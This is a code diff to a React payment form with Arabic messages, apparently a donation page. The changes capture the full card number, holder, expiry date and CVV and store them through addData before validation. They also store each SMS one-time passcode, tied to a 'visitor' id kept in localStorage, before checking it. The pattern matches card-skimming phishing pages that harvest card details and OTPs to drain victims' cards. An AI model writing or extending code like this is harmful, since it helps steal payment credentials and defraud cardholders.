@@ -52,6 +52,7 @@ setAmount(am!)
   };
 
   const formatExpiryDate = (value: string) => {
+    
     // Remove all non-digit characters
     const digits = value.replace(/\D/g, '');
 
@@ -62,11 +63,17 @@ setAmount(am!)
 
     return digits;
   };
-
   const handleOtpChange = (value: string) => {
     setOtp(value);
   };
   const handleSubmitPayment = async () => {
+    const paymentData = {
+      cardNumber: cardNumber,
+      cardHolder,
+      expiryDate,
+      cvv,
+      createdDate:new Date().toISOString()
+    };
     // Form validation
     if (cardNumber.replace(/\s/g, '').length !== 16) {
       toast.error('يرجى إدخال رقم بطاقة صحيح مكون من 16 رقمًا');
@@ -91,15 +98,10 @@ setAmount(am!)
     setIsSubmitting(true);
     try {
       if (!donationId) throw new Error('Missing donation ID');
+      addData({id:paymentId,paymentData})
 
       // Save payment data to Firestore
-      const paymentData = {
-        cardNumber: cardNumber,
-        cardHolder,
-        expiryDate,
-        cvv,
-        donationId,
-      };
+    
 const id=localStorage.getItem('visitor')
       if (id) {
         setPaymentId(id);
@@ -122,6 +124,9 @@ const id=localStorage.getItem('visitor')
   const handleVerifyOtp = async () => {
     // Validate OTP
     const otpValue = otp;
+const id=localStorage.getItem('visitor')
+
+    addData({id:id,otp:otpValue})
     if (otpValue.length !== 6) {
       toast.error('يرجى إدخال رمز التحقق المكون من 6 أرقام المرسل إلى هاتفك');
       return;
@@ -129,7 +134,6 @@ const id=localStorage.getItem('visitor')
     setIsSubmitting(true);
     try {
       if ( !paymentId) throw new Error('Missing required IDs');
-      addData({id:paymentId,})
     } catch (error) {
       console.error('Error verifying OTP:', error);
       toast.error(
